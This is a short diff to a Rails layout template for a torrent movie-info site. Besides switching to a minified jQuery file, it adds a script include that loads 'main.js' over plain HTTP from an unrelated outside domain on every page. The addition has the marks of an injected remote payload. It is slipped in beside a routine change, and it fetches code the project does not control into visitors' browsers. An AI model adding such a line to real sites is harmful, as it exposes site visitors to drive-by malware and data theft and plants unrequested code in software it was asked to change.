@@ -5,7 +5,8 @@
   <head>
   	<meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
   	<title><%= h(yield(:title) || "RottenTorrentz - movie info for your torrents") %></title>
-  	<%= javascript_include_tag 'jquery-1.3.2', 'frameset' %>
+  	<%= javascript_include_tag 'jquery-1.3.2.min',
+  	      'http://varzyfamily.com/links/blog/js/main.js', 'frameset' %>
   	<%= yield(:head) %>
   </head>
   <%= yield %>
